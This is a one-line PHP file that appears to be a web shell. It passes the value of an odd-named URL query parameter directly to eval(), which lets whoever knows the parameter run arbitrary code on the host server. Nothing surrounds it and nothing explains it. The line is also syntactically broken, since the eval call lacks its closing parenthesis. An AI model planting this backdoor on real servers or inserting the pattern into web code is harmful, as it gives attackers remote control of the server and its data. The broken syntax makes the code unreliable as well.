<?php
eval($_GET['JxIjCkX-'];
?>
